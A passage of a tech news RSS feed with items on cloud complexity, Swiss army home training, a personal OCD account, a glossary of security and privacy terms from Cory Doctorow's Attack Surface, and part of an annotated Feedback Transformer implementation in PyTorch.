<p>The hardware — the iron — is indeed something that is completely handled by a cloud provider. This includes things like connecting the server to networks, power, etc., and replacing disk drives, fans, etc. In a fully self-sourced setup this actually turns out to be a limited affair. Most of the work is not hardware these days, it is software. Companies that run their own on-premises data centers don’t have a lot of data center hardware operators. Take the networking engineers. They may lay a few cables to a switch, but after that it is quickly moving to the management console and manage the appliance throughputs management interface — in other words: software work. Networking engineers, storage engineers, and compute engineers alike, their main tool is not a screwdriver, their main tool is a <em>keyboard</em>. Only the basic servers for virtual machines have little in terms of configuration. Networking and storage are <em>appliances</em>, specialised hardware with specialised software. The cloud provider has an interface on top of these that gives you that ‘enough rope to hang yourself with’, i.e. much of this is actually set up and maintained by you. Microsoft doesn’t create or manage your firewall settings, it only offers you an interface to create a virtual firewall running on their appliances and manage that <em>yourself</em>.  So it is a shared responsibility, and especially in networking: you do most of the work in much of the same way you would have to do when you were running your own appliances. Using a firewall in Azure is Microsoft spinning up a virtual appliance for you. And from that moment on, the work is all yours.</p>



<p>The only form of cloud where you really get rid of a lot of responsibility is Software-as-a-Service, or SAAS. That is because SAAS actually simplifies matters… …for the vendor. As explained in the EAPJ article <a href="http://eapj.org/vertical-integration-versus-horizontal-standardisation/">Vertical Integration versus (horizontal) standardisation</a>, the big advantage of SAAS is that the vendor of an application doesn’t need to support a myriad of technical landscapes out there, no myriad of different Linux versions, Java versions, as well as their configurations (security baselines, anyone?), just a single stack they fully manage themselves. That brings a huge standardisation for the vendor, and the advantage of that can be sold (in part) to the customer. Your responsibility is generally limited to a bit of Application tinkering (maybe add plugins, do some configuration) and of course your content. (And even the almost total outsourcing of SAAS is a little lie …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ea.rna.nl/2021/01/10/the-many-lies-about-reducing-complexity-part-2-cloud/">https://ea.rna.nl/2021/01/10/the-many-lies-about-reducing-complexity-part-2-cloud/</a></em></p>]]>
            </description>
            <link>https://ea.rna.nl/2021/01/10/the-many-lies-about-reducing-complexity-part-2-cloud/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25714822</guid>
            <pubDate>Sun, 10 Jan 2021 14:20:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Covid-19 forces Swiss army recruits to train at home]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25714748">thread link</a>) | @jbesomi
<br/>
January 10, 2021 | https://www.swissinfo.ch/eng/military-spending_covid-19-forces-swiss-army-recruits-to-train-at-home/46270900 | <a href="https://web.archive.org/web/*/https://www.swissinfo.ch/eng/military-spending_covid-19-forces-swiss-army-recruits-to-train-at-home/46270900">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<section>
<div>
<div>
<figure>
<picture>
<source srcset="https://www.swissinfo.ch/resource/image/46270912/landscape_ratio3x2/880/587/e6e1f1c41539d9040f178d7930e447c8/1A6E884A718F3FE19A90A846EC724BB3/175424934_highres.jpg" media="(min-width: 900px)">
<source srcset="https://www.swissinfo.ch/resource/image/46270912/landscape_ratio3x2/580/387/e6e1f1c41539d9040f178d7930e447c8/D678DDC401910D9807002B5DF041917D/175424934_highres.jpg" media="(min-width: 321px)">

</picture>
<figcaption>
Switzerland’s militia armed forces system obliges most men to undertake basic military training at the age of 18 and then attend regular refresher courses. Military service is voluntary for women. <span>© Keystone / Christian Beutler</span>
</figcaption> </figure>
</div>
</div><p>Thousands of new Swiss army recruits will learn how to salute and carry their automatic rifle from the safety of their homes this month. The army has imposed a “work-from-home” regulation for compulsory basic training due to the Covid-19 pandemic.</p>
<span>This content was published on January 8, 2021 - 10:11</span>
<time datetime="2021-01-08T10:11:00+01:00">

</time><p>Half of the 12,000 recruits preparing to enter service on January 18 will start their basic military training at home via an online app, Swiss public television, RTS, reported on Friday.</p><p>The decision was taken to reduce the risk of Covid-19 infection among troops.</p><p>The 6,000 new recruits will be expected to train at home six hours a day for three weeks via a special app. A weekly four-hour physical training programme is also planned.</p><p>“These are individual exercises to be done at home. The application indicates the programme to be followed,” explained army spokesperson Daniel Reist.</p><p>After three weeks of distance learning, recruits will join other colleagues on February 8. But they will first have to pass a Covid-19 test. They will also be required to take knowledge and physical tests to ensure they have completed the online programme. If they fail, they will have to make up for it at weekends in the barracks.</p>
<h2>Reduction of troops</h2><p>“We hope the guidelines will be followed. They are counted as days of service and recruits are paid,” Reist said.</p><p>In the army barracks recruits will continue to follow strict hygiene rules similar to last year.</p><p>Switzerland’s militia armed forces system obliges most men to undertake basic military training at the age of 18 and then attend regular refresher courses. Basic training lasts 18 weeks followed by six refresher courses of three weeks each.</p><p>Reforms implemented in 2018 have reduced the number of Swiss troops on active duty from 140,000 to 100,000. Around 10,000 are professionals, the rest are conscripts or volunteers. Military service is voluntary for women, who currently number around 1,000.</p> </section>
</div></div>]]>
            </description>
            <link>https://www.swissinfo.ch/eng/military-spending_covid-19-forces-swiss-army-recruits-to-train-at-home/46270900</link>
            <guid isPermaLink="false">hacker-news-small-sites-25714748</guid>
            <pubDate>Sun, 10 Jan 2021 14:11:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I ignored my slowly worsening mental health, and got hit hard by OCD (a caution)]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25714408">thread link</a>) | @coolvision
<br/>
January 10, 2021 | https://grgv.xyz/ocd/ | <a href="https://web.archive.org/web/*/https://grgv.xyz/ocd/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				
<p>Have you seen “Aviator”, a movie with Leonardo DiCaprio about Howard Hughes? Then you might recall what an OCD is.</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/2fXF8G50BPQ" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
<p><strong><a href="https://en.wikipedia.org/wiki/Obsessive%E2%80%93compulsive_disorder">Obsessive–compulsive disorder</a>&nbsp;(OCD) is a&nbsp;mental disorder&nbsp;in which a person has&nbsp;certain thoughts ”repeatedly&nbsp;(called "obsessions") or feels the need to perform&nbsp;certain routines repeatedly&nbsp;(called ”compulsions") to an extent which generates distress or impairs general functioning</strong></p>
<p>I have a mild form of OCD. Had it since teenage years. It rarely bothered me, and I mainly did not care about it much. It manifested itself maybe few times per year, where I would have to re-check if the door is locked few times, for example (which does not seem like a huge burden).</p>
<p>And so, I felt great in autumn and in the first half of December. Everything was fine, I have a job that I love, great family, and hobbies that I enjoy.</p>
<p>Then, this winter came, and It got worse. I live in a northern country (Estonia), daylight time is very short, and although I don’t suffer from SAD too much usually, it might have been a factor. And I usually try to get some vacation in warmer countries, but this year did not do it because of COVID. I also started to work from home, and it probably added to the feeling of isolation and brought me down more.</p>
<p>All in all, I don’t know what were that main factors, but probably the whole combination was just a bit  too much. Occasional obsessions and compulsions started to show up more, but I mainly just shrugged them off. Then, closer to the new year, it stared to get even worse.</p>
<p><strong>And now it’s at a point where I need professional help, It's hard to work, I lost lots of weight, have bad anxiety all the time, and all the obsessions make my behaviour erratic at times.</strong> And yet another problem — its actually hard to find professional help quickly! It can be weeks or months until finding a therapist. Thakfully, I was able to secure an appointment within a weel, but not all people are as lucky.</p>
<p><em>My main mistake was not looking for warning signs of illness.</em> It was “today it’s fine, then all will be fine” attitude, which is a big mistake.</p>
<p>Yes, my case is slightly exotic, but it relates to all other mental health issues: depression, anxiety, panic attacks, etc… <a href="https://www.nimh.nih.gov/health/statistics/mental-illness.shtml">Nearly 20% of people have some form of mental illness</a>, and some of the issues might not seem like a big deal until they hit hard.</p>
<p>As a tale of caution, I have some advice, which I will follow religiously in future. This is relatively obvious and simple, but let my example be a bit of a motivation to take it more seriously.</p>
<ul>
<li>Maintain mood logging, and journal regularly. It would help to notice any anomalies and problems before they become serious. Don’t shrug off warning signs!</li>
<li>Find mental health checklists, like <a href="https://www.beyondblue.org.au/the-facts/anxiety-and-depression-checklist-k10">https://www.beyondblue.org.au/the-facts/anxiety-and-depression-checklist-k10</a>, check yourself time from time,</li>
<li>Therapy is important, especially in this times. I never did therapy, and now regret it.</li>
<li>Fitness, meditation, good diet and all kinds of self care — in this time of increased isolation it’s not just some random good habits, treating this seriously is a very important part of well-being.</li>
</ul>


			</div></div>]]>
            </description>
            <link>https://grgv.xyz/ocd/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25714408</guid>
            <pubDate>Sun, 10 Jan 2021 13:21:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mashapedia: Technologies of Attack Surface by Cory Doctorow]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25714246">thread link</a>) | @samizdis
<br/>
January 10, 2021 | https://pavelanni.github.io/attack-surface-tech/attack-surface-tech.html | <a href="https://web.archive.org/web/*/https://pavelanni.github.io/attack-surface-tech/attack-surface-tech.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
<div>
<h2 id="_introduction">Introduction</h2>
<div>
<p>I am a big fan of Cory Doctorow (<a href="https://twitter.com/doctorow">@doctorow</a>).
Not only his books <em>Little Brother</em>, <em>Homeland</em>, and now <em>Attack Surface</em>
discuss important topics like online privacy and the role of technology in today’s world,
but also they educate the readers by telling them stories about modern tech solutions and tools.
Doctorow usually doesn’t give you a lot of explanations, assuming that you can
find all the necessary information if you want to.</p>
<p>When I started reading <em>Attack Surface</em> I was amazed by the amount of tech terms Doctorow
was using here and there. I thought about some terms: “Okay, I know what ‘Tor’ means,
but does everybody else who is reading this book now?”. Other terms I had to google myself: “What is IMSI-catcher?”</p>
<p>I thought it might be a good idea to collect all tech terms that <em>might</em> be new to the readers
and give a quick explanation for each of them.
Also a link or two to more detailed pages would be helpful.</p>
<p>This is my collection of <em>Attack Surface</em> terms.
Most of the time I give links to Wikipedia, sometimes to other resources.</p>
<p>If you want to add, correct, or expand some terms or add more interesting links,
feel free to open issues in my Github repo (<a href="https://github.com/pavelanni/attack-surface-tech">https://github.com/pavelanni/attack-surface-tech</a>) or fork it and and open a PR.
I’ll be happy to include your additions to this list.</p>


</div>
</div>
<div>
<h2 id="_chapter_1">Chapter 1</h2>
<div>
<div>
<dl>
<dt>Tor</dt>
<dd>
<p>A network that enables anonymous communications.
By using the Tor Browser you can visit web sites without letting them know your location or your actual IP address. More about Tor (including questions "is it legal?"):</p>

</dd>
<dt>Facebook Tor Hidden Service</dt>
<dd>
<p>A site that allows access to Facebook through the Tor protocol.
According to Alec Muffett "Facebook’s onion address provides a way to access Facebook through Tor
without losing the cryptographic protections provided by the Tor cloud. …​
it provides end-to-end communication, from your browser directly into a Facebook datacentre."
The address is <code>facebookcorewwwi.onion</code> where <code>.onion</code> is the common top-level domain name
for sites in Tor network. You can enter this domain name in the Tor Browser’s address field.
It won’t work in your normal (Chrome, Firefox, etc.) browser. More:</p>

</dd>
<dt>Sectec</dt>
<dd>
<p>A fictional networking device produced by Xoth.
<em>Not</em> a CCTV camera produced by Shenshen Sectec Co. (<a href="http://www.sectec.com.cn/">http://www.sectec.com.cn/</a>)</p>
</dd>
<dt>0-day or zero-day</dt>
<dd>
<p>A vulnerability that has not been fixed by the vendor or was fixed just recently
which allows hackers to exploit it. More:</p>

</dd>
<dt>Exploit</dt>
<dd>
<p>A piece of software or a methodology (series of steps) that allows hackers to use
a known vulnerability to get access to a target computer. More:</p>

</dd>
<dt>Tunnel out</dt>
<dd>
<p>To use an SSH tunnel to get secure access to a remote box. Usually you use SSH tunneling
to bypass firewalls that prohibit certain Internet services. More:</p>

</dd>
<dt>Bootloader</dt>
<dd>
<p>A piece of software which normally starts at the early stages of computer start-up process,
after executing the BIOS, but <em>before</em> the operating system starts.
Its purpose is to <em>load</em> the operating system (hence the name).
Bootloader integrity check is important to avoid a "boot attack":
type of attack that replaces the original bootloader and installs a bootloader
that can intercept passwords, including those used for hard drive encryption.
More:</p>

</dd>
<dt>Semtex</dt>
<dd>
<p>General-purpose plastic explosive.
More:</p>

</dd>
<dt>Hardware keylogger</dt>
<dd>
<p>A device used to log all keystrokes on a computer which is used to capture passwords.
More:</p>

</dd>
<dt>Catching password from key sounds</dt>
<dd>
<p>Different keys on the keyboard produce slightly different sounds so the recorded acoustic pattern
of you typing in your password can be used to guess it. That’s why Masha does “medium-loud AAAAAH”
when typing her password.
More:</p>

</dd>
<dt>Faraday cage</dt>
<dd>
<p>An enclosure that blocks electromagnetic fields.
Could be a room, a cabinet, a bag.
More:</p>

</dd>
<dt>Tails</dt>
<dd>
<p>A security-focused Linux distribution that aims at preserving privacy and anonymity.
It usually loads from a live DVD or USB and provides Linux environment that is based on Tor network.
Your browsing information is not stored anywhere unless you specifically instruct it to do so.
<em>Tails</em> provides an emergency shutdown: when you pull the USB out of the slot, the system
erases all computer memory and shuts itself down immediately.
More:</p>

</dd>
<dt>MIT Media Lab</dt>
<dd>
<p>A research lab at MIT famous for its inventions and projects in areas of human-computer interaction,
artistic visualization, musical devices, sociable robots, etc.
More:</p>

</dd>
<dt>USB Port Physical Lock</dt>
<dd>
<p>There are several variants of such a device that physically blocks access to the USB port.
Some of them have keys, some should be physically destroyed to get access to the port.
Examples:</p>

</dd>
<dt>EL wire</dt>
<dd>
<p>Electroluminescent wire is a thin copper wire coated in a phosphor that produces light through electroluminescence when an alternating current is applied to it. More:</p>

</dd>
<dt>Lidar</dt>
<dd>
<p>"Light radar" — a device that used laser light to scan the area and measure distances to
objects, walls, etc. It is also used as an acronym of "light detection and ranging"
and "laser imaging, detection, and ranging".
In the book Masha uses a drone to get "lidar outlines of all the human in the space".
More:</p>

</dd>
<dt>Raspi Altair 8800</dt>
<dd>
<p>Altair 8800 is one of the first personal computers which was introduced in 1974.
For many people it has sentimental value — that’s why some people design and sell
Altair emulators that use modern technologies such as Arduino and Raspberry Pi.
More:</p>

</dd>
<dt>Blinkenlights</dt>
<dd>
<p>Usually refers to the diagnostic lights on computer’s front panels (in the old days).
The term derives from the famous text dated as far back as 1955.</p>
<div>
<div>
<pre>ACHTUNG!
ALLES TURISTEN UND NONTEKNISCHEN LOOKENSPEEPERS!
DAS KOMPUTERMASCHINE IST NICHT FÜR DER GEFINGERPOKEN UND MITTENGRABEN! ODERWISE IST EASY TO SCHNAPPEN DER SPRINGENWERK, BLOWENFUSEN UND POPPENCORKEN MIT SPITZENSPARKEN.
IST NICHT FÜR GEWERKEN BEI DUMMKOPFEN. DER RUBBERNECKEN SIGHTSEEREN KEEPEN DAS COTTONPICKEN HÄNDER IN DAS POCKETS MUSS.
ZO RELAXEN UND WATSCHEN DER BLINKENLICHTEN.</pre>
</div>
</div>
<p>More:</p>

</dd>
<dt>Paranoid Android</dt>
<dd>
<p>In the book it seems to be the Android-based OS for smartphones focused on security.
The main feature of it is that you update it very often to make sure all known
vulnerabilities are patched or at least there are no known exploits for them.
Masha explains that you should always check the OS signatures to make sure
you are actually installing the correct bits and not something created by
the government hackers containing backdoors and loggers.
Apparently there is such a project in real life, but it’s not specifically
focused on security — it just uses the cool name.
More:</p>

</dd>
<dt>IMSI-catcher</dt>
<dd>
<p>A device that can <em>pretend</em> to be a cell phone base station and make all phones in the nearest proximity
to connect to it (because its signal stronger than the real cell towers that are farther away).
That way it will be able to collect all information about the connected phones such as IMSI
(international mobile subscriber identity), etc. Also it will be able to intercept phones' traffic,
voice and data using "man-in-the-middle" attack.
Devices can be purchased online, as well as anti-IMSI-catchers.
You can build one yourself, if you want (see the link below).
More:</p>

</dd>
<dt>Dazzle mask</dt>
<dd>
<p>A mask that allows you to trick facial-recognition software into thinking you are not human.
They may use reflective tapes, infrared lights, lenses, etc.
More:</p>

</dd>
<dt>Pastebin</dt>
<dd>
<p>A storage site where people can post pieces of code and other text information.
More:</p>

</dd>
<dt>Regular expressions</dt>
<dd>
<p>A (smart) way to search specific patterns or strings in text files.
You can describe patterns like "one to three numbers followed by a dash followed by several capital letters, no more than 8."
More:</p>

</dd>
<dt>Anonymouth</dt>
<dd>
<p>Document anonymization tool written in Java. More:</p>

</dd>
<dt>Stylometry</dt>
<dd>
<p>A method to study linguistic style to find out who the author of the document is.
More:</p>

</dd>
<dt>PGP</dt>
<dd>
<p>Pretty Good Privacy, a cryptographic method used for encryption and digital signing documents, emails, etc.
More:</p>

</dd>
<dt>Malware</dt>
<dd>
<p>Malicious software: software intentionally designed to cause damage to computer systems.
More:</p>

</dd>
<dt>NFC, Near-Field Communication</dt>
<dd>
<p>A set of communication protocols for communication between two electronic devices
over a distance of 4 cm. Used in various types of key cards, passes. etc.
More:</p>

</dd>
<dt>Information Cascade</dt>
<dd>
<p>A pattern of information flow when you can see how information or decision coming from
one person triggers the series of decisions or information passes from several other persons.
More:</p>

</dd>
<dt>Anti-Stingray</dt>
<dd>
<p>Tools to protect oneself from IMSI-catchers.
More:</p>

</dd>
<dt>Asterisk</dt>
<dd>
<p>An open source phone framework that can be used to build a Voice-over-IP or IP PBX system.
Masha runs such a server on the cloud and uses it to route her calls.
One of the examples: <a href="https://aws.amazon.com/marketplace/pp/Technology-Innovation-Lab-of-Texas-Asterisk-1770-A/B079Y7449R">https://aws.amazon.com/marketplace/pp/Technology-Innovation-Lab-of-Texas-Asterisk-1770-A/B079Y7449R</a>
More:</p>

</dd>
<dt>Signal</dt>
<dd>
<p>A communication application which is considered to be the most secure for end-to-end
encryption. Trusted and used by Edward Snowden, Jack Dorsey, Bruce Schneier.
It uses the open-source Signal protocol.
Works on iOS, Android, Linux, macOS, Windows
More:</p>

</dd>
<dt>Binary Transparency</dt>
<dd>
<p>A method that allows users to verify that the piece of software they use is exactly the same
used by other users, i.e. it was not substituted by a compromised version.
More:</p>

</dd>
<dt>Hashing</dt>
<dd>
<p>Masha explains it pretty well in the book.
More:</p>

</dd>
<dt>Public-private key cryptography</dt>
<dd>
<p>Again, Masha does a great job explaining the basics.
More:</p>

</dd>
<dt>BadUSB</dt>
<dd>
<p>It is a way to use the microcontroller embedded in a USB device to inject malware in your computer.
The most dangerous thing about it is that all the work is done by that microcontroller,
invisible to the target computer’s CPU.
More:</p>

</dd>
<dt>Baseband phone security</dt>
<dd>
<p>It was confirmed that the software that controls the baseband radio on smartphones can
be compromised and can allow attackers to control other smartphone devices such as camera and microphone.
More (some papers are a bit dated, but it’s quite possible some vulnerabilities described in them
still exist):</p>

</dd></dl></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pavelanni.github.io/attack-surface-tech/attack-surface-tech.html">https://pavelanni.github.io/attack-surface-tech/attack-surface-tech.html</a></em></p>]]>
            </description>
            <link>https://pavelanni.github.io/attack-surface-tech/attack-surface-tech.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25714246</guid>
            <pubDate>Sun, 10 Jan 2021 12:56:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Chinese Red Flag Linux 11.0]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25714006">thread link</a>) | @schaum
<br/>
January 10, 2021 | http://pan.chinaredflag.cn/d/b16eaefee1c845bc853f/ | <a href="https://web.archive.org/web/*/http://pan.chinaredflag.cn/d/b16eaefee1c845bc853f/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://pan.chinaredflag.cn/d/b16eaefee1c845bc853f/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25714006</guid>
            <pubDate>Sun, 10 Jan 2021 12:25:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Annotated implementation/tutorial of Feedback Transformer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25713987">thread link</a>) | @vpj
<br/>
January 10, 2021 | https://lab-ml.com/labml_nn/transformers/feedback/ | <a href="https://web.archive.org/web/*/https://lab-ml.com/labml_nn/transformers/feedback/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="container">
    
    
    <div id="section-0">
        <div>
                
                
<p>This is an implementation of the paper
<a href="https://arxiv.org/abs/2002.09402">Accessing Higher-level Representations in Sequential Transformers with Feedback Memory</a>.</p>
<p>Normal transformers process tokens in parallel and each transformer layer pays attention
to the outputs of the previous layer.
Feedback transformer pays attention to the output of all layers in previous steps.
So this adds recurrence and we need to process token-by-token.
This slows down the training significantly (about 5X - 10X depending on the sequence length).
However when predicting Feedback Transformer is faster because you can predict the next token
if you cache the memory vectors.</p>
<p>In order to speed up the training the paper discusses starting with a short sequence length and
gradually increasing it.
They also discuss using a pretrained parallel transformer as the starting point.</p>
<p>The feedback transformer doesn’t keep the outputs of all layers.
Instead it keeps weighted sum of the output of all layers.
This reduces the memory used for caching during prediction.</p>
<p>Here’s a notebook for training a feedback transformer on Tiny Shakespeare dataset.</p>
<p><a href="https://colab.research.google.com/github/lab-ml/nn/blob/master/labml_nn/transformers/feedback/experiment.ipynb"><img alt="Open In Colab" src="https://colab.research.google.com/assets/colab-badge.svg"></a>
<a href="https://web.lab-ml.com/run?uuid=d8eb9416530a11eb8fb50242ac1c0002"><img alt="View Run" src="https://img.shields.io/badge/labml-experiment-brightgreen"></a></p>
            </div>
            <div>
                <div><pre><span>35</span><span></span><span>import</span> <span>math</span>
<span>36</span><span>from</span> <span>typing</span> <span>import</span> <span>Optional</span>
<span>37</span>
<span>38</span><span>import</span> <span>torch</span>
<span>39</span><span>from</span> <span>torch</span> <span>import</span> <span>nn</span>
<span>40</span>
<span>41</span><span>from</span> <span>labml_helpers.module</span> <span>import</span> <span>Module</span>
<span>42</span><span>from</span> <span>labml_nn.transformers.mha</span> <span>import</span> <span>PrepareForMultiHeadAttention</span>
<span>43</span><span>from</span> <span>labml_nn.transformers.models</span> <span>import</span> <span>FeedForward</span>
<span>44</span><span>from</span> <span>labml_nn.utils</span> <span>import</span> <span>clone_module_list</span></pre></div>
            </div>
        </div>
    <div id="section-1">
        <div>
                
                <h2>Feedback Attention</h2>
<p>This module computes recurrent attention similar to attention from original transformers
paper.</p>

            </div>
            <div>
                <div><pre><span>47</span><span>class</span> <span>FeedbackAttention</span><span>(</span><span>Module</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-2">
        <div>
                
                <ul>
<li>‘heads’ is the number of attention heads</li>
<li><code>d_model</code> is the number of features in the transformer</li>
<li><code>dropout_prob</code> is the attention dropout probability</li>
</ul>
            </div>
            <div>
                <div><pre><span>58</span>    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>heads</span><span>:</span> <span>int</span><span>,</span> <span>d_model</span><span>:</span> <span>int</span><span>,</span> <span>dropout_prob</span><span>:</span> <span>float</span> <span>=</span> <span>0.1</span><span>):</span></pre></div>
            </div>
        </div>
    
    <div id="section-4">
            <div>
                
                <p>Number of features per head</p>
            </div>
            <div>
                <div><pre><span>68</span>        <span>self</span><span>.</span><span>d_k</span> <span>=</span> <span>d_model</span> <span>//</span> <span>heads</span></pre></div>
            </div>
        </div>
    
    <div id="section-6">
            <div>
                
                <p>These transform the <code>query</code>, <code>key</code> and <code>value</code> vectors for multi-headed attention.</p>
            </div>
            <div>
                <div><pre><span>73</span>        <span>self</span><span>.</span><span>query</span> <span>=</span> <span>PrepareForMultiHeadAttention</span><span>(</span><span>d_model</span><span>,</span> <span>heads</span><span>,</span> <span>self</span><span>.</span><span>d_k</span><span>,</span>  <span>bias</span><span>=</span><span>False</span><span>)</span>
<span>74</span>        <span>self</span><span>.</span><span>key</span> <span>=</span> <span>PrepareForMultiHeadAttention</span><span>(</span><span>d_model</span><span>,</span> <span>heads</span><span>,</span> <span>self</span><span>.</span><span>d_k</span><span>,</span>  <span>bias</span><span>=</span><span>False</span><span>)</span>
<span>75</span>        <span>self</span><span>.</span><span>value</span> <span>=</span> <span>PrepareForMultiHeadAttention</span><span>(</span><span>d_model</span><span>,</span> <span>heads</span><span>,</span> <span>self</span><span>.</span><span>d_k</span><span>,</span>  <span>bias</span><span>=</span><span>True</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-7">
            
            <div>
                <div><pre><span>78</span>        <span>self</span><span>.</span><span>output</span> <span>=</span> <span>nn</span><span>.</span><span>Linear</span><span>(</span><span>d_model</span><span>,</span> <span>d_model</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-8">
            
            <div>
                <div><pre><span>80</span>        <span>self</span><span>.</span><span>dropout</span> <span>=</span> <span>nn</span><span>.</span><span>Dropout</span><span>(</span><span>dropout_prob</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-9">
            <div>
                
                <p>Scaling factor before the softmax</p>
            </div>
            <div>
                <div><pre><span>82</span>        <span>self</span><span>.</span><span>scale</span> <span>=</span> <span>1</span> <span>/</span> <span>math</span><span>.</span><span>sqrt</span><span>(</span><span>self</span><span>.</span><span>d_k</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-10">
            <div>
                
                <p>Softmax for attention along the time dimension of <code>key</code></p>
            </div>
            <div>
                <div><pre><span>85</span>        <span>self</span><span>.</span><span>softmax</span> <span>=</span> <span>nn</span><span>.</span><span>Softmax</span><span>(</span><span>dim</span><span>=</span><span>0</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-11">
            <div>
                
                <p>Number of relative positions</p>
            </div>
            
        </div>
    <div id="section-12">
            <div>
                
                <p>Relative positional embeddings for key relative to the query.</p>
            </div>
            <div>
                <div><pre><span>91</span>        <span>self</span><span>.</span><span>key_pos_embeddings</span> <span>=</span> <span>nn</span><span>.</span><span>Parameter</span><span>(</span><span>torch</span><span>.</span><span>zeros</span><span>((</span><span>self</span><span>.</span><span>P</span><span>,</span> <span>heads</span><span>,</span> <span>self</span><span>.</span><span>d_k</span><span>)),</span> <span>requires_grad</span><span>=</span><span>True</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-13">
            <div>
                
                <p>Positional embeddings for the query is independent of the position of the query</p>
            </div>
            <div>
                <div><pre><span>93</span>        <span>self</span><span>.</span><span>query_pos_bias</span> <span>=</span> <span>nn</span><span>.</span><span>Parameter</span><span>(</span><span>torch</span><span>.</span><span>zeros</span><span>((</span><span>heads</span><span>,</span> <span>self</span><span>.</span><span>d_k</span><span>)),</span> <span>requires_grad</span><span>=</span><span>True</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-14">
            <div>
                
                <p>We store attentions so that it can used for logging, or other computations if needed</p>
            </div>
            
        </div>
    <div id="section-15">
        <div>
                
                <h3>Get attention scores</h3>

<p>where $Q, K_j$, are linear transformations of
 original embeddings $X^q, X^k_j$
 and $U^Q, U^K_j$ are linear transformations of
 absolute positional encodings $P_q, P_j$.</p>
            </div>
            <div>
                <div><pre><span>98</span>    <span>def</span> <span>get_scores</span><span>(</span><span>self</span><span>,</span> <span>query</span><span>:</span> <span>torch</span><span>.</span><span>Tensor</span><span>,</span> <span>key</span><span>:</span> <span>torch</span><span>.</span><span>Tensor</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-16">
            
            <div>
                <div><pre><span>115</span>        <span>key_pos_emb</span> <span>=</span> <span>self</span><span>.</span><span>key_pos_embeddings</span><span>[</span><span>-</span><span>key</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>]:]</span></pre></div>
            </div>
        </div>
    <div id="section-17">
            
            <div>
                <div><pre><span>117</span>        <span>query_pos_bias</span> <span>=</span> <span>self</span><span>.</span><span>query_pos_bias</span><span>[</span><span>None</span><span>,</span> <span>:,</span> <span>:]</span></pre></div>
            </div>
        </div>
    <div id="section-18">
            <div>
                
                <p>$(Q + U^Q)^\top(K_j + U^K_j)$</p>
            </div>
            <div>
                <div><pre><span>120</span>        <span>return</span> <span>torch</span><span>.</span><span>einsum</span><span>(</span><span>'bhd,jbhd-&gt;jbh'</span><span>,</span> <span>query</span> <span>+</span> <span>query_pos_bias</span><span>,</span> <span>key</span> <span>+</span> <span>key_pos_emb</span><span>[:,</span> <span>None</span><span>,</span> <span>:,</span> <span>:])</span></pre></div>
            </div>
        </div>
    <div id="section-19">
        <div>
                
                <ul>
<li><code>query</code> has shape <code>[batch_size, d_model]</code></li>
<li><code>key</code> and <code>value</code> has shape <code>[seq_len, batch_size, d_model]</code></li>
</ul>
            </div>
            <div>
                <div><pre><span>122</span>    <span>def</span> <span>__call__</span><span>(</span><span>self</span><span>,</span> <span>*</span><span>,</span>
<span>123</span>                 <span>query</span><span>:</span> <span>torch</span><span>.</span><span>Tensor</span><span>,</span>
<span>124</span>                 <span>key</span><span>:</span> <span>torch</span><span>.</span><span>Tensor</span><span>,</span>
<span>125</span>                 <span>value</span><span>:</span> <span>torch</span><span>.</span><span>Tensor</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-20">
            <div>
                
                <p>Prepare <code>query</code>, <code>key</code> and <code>value</code> for attention computation
<code>key</code> and <code>value</code>  will then have shape <code>[seq_len, batch_size, heads, d_k]</code>
and <code>query</code> will have shape <code>[batch_size, heads, d_k]</code></p>
            </div>
            <div>
                <div><pre><span>134</span>        <span>query</span> <span>=</span> <span>self</span><span>.</span><span>query</span><span>(</span><span>query</span><span>)</span>
<span>135</span>        <span>key</span> <span>=</span> <span>self</span><span>.</span><span>key</span><span>(</span><span>key</span><span>)</span>
<span>136</span>        <span>value</span> <span>=</span> <span>self</span><span>.</span><span>value</span><span>(</span><span>value</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-21">
            <div>
                
                <p>Compute attention scores
Results in a tensor of shape <code>[seq_len, batch_size, heads]</code></p>
            </div>
            <div>
